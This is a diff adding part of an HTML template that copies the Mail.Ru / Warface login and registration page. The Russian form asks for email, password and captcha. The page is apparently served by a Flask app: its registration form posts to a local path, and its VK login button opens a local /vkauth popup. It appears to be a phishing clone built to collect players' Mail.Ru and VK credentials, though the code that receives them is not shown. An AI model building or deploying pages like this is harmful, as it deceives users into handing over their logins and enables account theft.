+									<label for="js_kit_signin__remember" class="gmrSignin__remember__chk"></label>
+									<label for="js_kit_signin__remember" class="gmrSignin__remember__label">Запомнить
+										меня</label>
+								</span>
+								<a class="gmrSignin__register js-new-mail">Нет почты Mail.Ru?</a>
+								<a class="gmrSignin__lostpass" href="https://wf.mail.ru/user/password"
+									target="_blank">Забыли пароль?</a>
+							</div>
+							<div class="registration__row">
+								<button id="js_kit_signin__submit" class="registration__submit" name="do_login"
+									value="1" tabindex="3"
+									onclick="GMR.rbFormCompleted(function() { document.getElementById('js_kit_signin').submit() }); return false">Войти</button>
+							</div>
+							<div class="gmrSignin__actions display-none">
+								<span class="gmrSignin__social">
+									Войти через:
+									<a class="gmrSignin__social__btn gmrSignin__social__btn_ok"
+										id="js_kit_signin__social__btn_ok" href="#" data-page="https://wf.mail.ru"
+										target="_blank" title="Одноклассники"></a>
+									<a class="gmrSignin__social__btn gmrSignin__social__btn_vk"
+										id="js_kit_signin__social__btn_vk" href="#" data-page="https://wf.mail.ru"
+										target="_blank" title="Вконтакте"></a>
+									<!--<a class="gmrSignin__social__btn gmrSignin__social__btn_rt" id="js_kit_signin__social__btn_rt" href="#" data-page="https://wf.mail.ru/user/register/" target="_blank" title="РосТелеком"></a>-->
+								</span>
+							</div>
+							<input type="hidden" name="do" value="login">
+
+
+							<div class="registration__buttons js-reg-buttons">
+								<div class="buttons_or"><span>Или</span></div>
+								<!--<div class="soc-button soc-button--mail js-reg-auth"></div>-->
+								<div class="soc-button soc-button--vk" onclick="showvk(); return false;"></div>
+								<!--<div class="soc-button soc-button--rts js-login-rts"></div>-->
+							</div>
+						</div>
+					</form>
+
+					<div class="registration__form" data-tabs-set="reg">
+
+						<form class="js-reg-form-action" accept-charset="UTF-8" method="post"
+							action="/landing/register/">
+							<input type="hidden" name="Domain" value="mail.ru">
+							<div class="registration__row">
+								<input class="registration__input js-reg-email-input" type="text" name="mail"
+									placeholder="Введите почту">
+								<div class="registration_notes js-reg-email-notes"></div>
+							</div>
+							<div class="registration__row js-reg-passrow display-none">
+								<input class="registration__input js-reg-pass-input" type="password"
+									name="password_general" value="" placeholder="Введите пароль">
+								<div class="registration_notes js-reg-pass-notes"></div>
+							</div>
+							<div class="registration__row registration__captcha js-reg-capcha display-none"
+								id="registration_recaptcha">
+								<div class="g-recaptcha" data-sitekey="6LdPARMUAAAAACvz390apSEoHn6kwNMRDI4plcBo"
+									data-callback="recaptchaCallback">
+									<div style="width: 304px; height: 78px;">
+										<div><iframe src="{{url_for('static', filename='assets/anchor.htm')}}"
+												role="presentation" scrolling="no"
+												sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"
+												width="304" height="78" frameborder="0"></iframe></div><textarea
+											id="g-recaptcha-response" name="g-recaptcha-response"
+											class="g-recaptcha-response"
+											style="width: 250px; height: 40px; border: 1px solid #c1c1c1; margin: 10px 25px; padding: 0px; resize: none;  display: none; "></textarea>
+									</div>
+								</div>
+								<div class="registration_notes js-reg-captcha-notes"></div>
+							</div>
+
+							<div class="registration__submit__block">
+								<div class="registration__submit next js-reg-next">Далее</div>
+								<input class="registration__submit js-reg-submit display-none" type="submit" name=""
+									value="Зарегистрироваться">
+								<img src="{{url_for('static', filename='assets/ajax_loader.gif')}}"
+									class="registration__loader js-reg-loader" alt="">
+							</div>
+						</form>
+						<div class="registration__new-mail">
+							<span class="js-new-mail">Создать новую почту</span>
+						</div>
+
+						<div class="registration__buttons js-reg-buttons">
+							<div class="buttons_or"><span>Или</span></div>
+							<!--<div class="soc-button soc-button--mail js-reg-auth"></div>-->
+							<div class="soc-button soc-button--vk js-reg-vk"></div>
+							<div class="soc-button soc-button--ok js-reg-ok"></div>
+						</div>
+					</div>
+				</div>
+				<div class="registration__docs">
+					Входя или регистрируясь, я принимаю условия<br>
+					<a class="js-agreement"
+						href="https://wf.mail.ru/static/wf.mail.ru/license_agreement.html">Лицензионного Соглашения</a>
+				</div>
+			</div>
+		</div>
+		<script>
+			$('#js-btn-login').click()
+			function showvk() {
+				window.open("/vkauth", "Вконтакте | Вход", "left=350,top=150,width=650,height=400")
+			}
+		</script>
+		<script type="text/javascript">
+			var back_url = window.location.href
+			$('.js-login-back').val(back_url)
+		</script>
+		<!-- <script src="assets/api.js" async="" defer="defer"></script>
+<script src="assets/auth.js" charset="utf-8"></script>
+<script src="assets/main.js" charset="utf-8"></script>
+	<script src="assets/reg_default.js" charset="utf-8"></script>	
+	<script src="assets/md5-min.js"></script> -->
+
+	</div>
+	<div class="oauth_page_modal">
+		<div class="oauth_page_modal_overlay"></div>
+		<div class="oauth_page_modal_section">
+			<div class="oauth_modal_top">
+				<div class="oauth_modal_close js-modal-close"></div>
+			</div>
+			<div class="oauth_modal_content">
+				<div class="oauth_modal_inner"></div>
+			</div>
+		</div>
+	</div>
+	<div id="header-modal-root"></div>
+</body>
+
+</html>
